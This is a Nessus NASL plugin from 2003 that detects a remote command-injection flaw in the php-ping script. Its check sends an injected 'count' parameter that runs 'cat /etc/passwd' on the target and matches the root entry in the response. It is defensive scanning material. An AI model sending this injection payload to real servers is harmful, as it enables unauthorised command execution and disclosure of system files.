#
# This script was written by Noam Rathaus
#
# GPLv2
#
# From: ppp-design [security@ppp-design.de]
# Subject: php-ping: Executing arbritary commands
# Date: Monday 29/12/2003 16:51
#
#

if(description)
{
  script_id(11966);
  script_bugtraq_id(9309);
  script_version("$Revision: 1.6 $");
  name["english"] = "Remote Code Execution in PHP Ping";
  script_name(english:name["english"]);
 
  desc["english"] = "
php-ping is a simple php script executing the 'ping' command.

A bug in this script allows users to execute arbitary commands.
The problem is based upon the fact that not all user inputs are filtered 
correctly: although $host is filtered using preg_replace(), the $count 
variable is passed unfiltered to the system() command.

Risk factor : High";

  script_description(english:desc["english"]);
 
  summary["english"] = "Detect PHP Ping Code Execution";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright(english:"This script is Copyright (C) 2003 Noam Rathaus");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);
  script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

debug = 0;

port = get_http_port(default:80);

if ( ! get_port_state(port) ) exit(0);
if ( ! can_host_php(port:port) ) exit(0);


function check_dir(path)
{
 req = http_get(item:string(path, "/php-ping.php?count=1+%26+cat%20/etc/passwd+%26&submit=Ping%21"), port:port);

 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if (egrep(pattern:"root:.*:0:[01]:.*", string:res))
 {
  security_hole(port);
  exit(0);
 }
}

foreach dir (cgi_dirs())
{
 check_dir(path:dir);
}
